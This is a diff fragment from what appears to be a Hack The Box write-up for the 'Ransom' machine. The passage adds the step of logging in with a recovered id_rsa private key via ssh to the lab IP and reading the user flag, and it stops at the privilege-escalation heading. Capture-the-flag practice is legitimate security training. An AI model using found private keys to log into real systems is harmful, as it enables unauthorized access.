@@ -455,4 +455,42 @@ Perfect!! Let's access the .ssh directory to see if there is any private key wit
 
 <br />
 
+When entering the.ssh directory, we see the typical files, including the authorized_keys, which helps us to verify that the owner of the id_rsa is the user "htb".
 
+Once this is known, we proceed to connect to the Victim Machine with the id_rsa:
+
+<br />
+
+
+```bash
+❯ ssh -i id_rsa htb@10.10.11.153
+Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-77-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+0 updates can be applied immediately.
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Mon Jul  5 11:34:49 2021
+htb@ransom:~$ export TERM=xterm
+htb@ransom:~$ cd /home/htb
+htb@ransom:~$ ls
+user.txt
+htb@ransom:~$ cat user.txt 
+14917109049c34d17dc685d467xxxxxx
+```
+
+<br />
+
+Perfect!! We have the user flag. Intrusion ready!!
+
+<br />
+
+# Privilege Escalation: htb -> root
+
+<br />
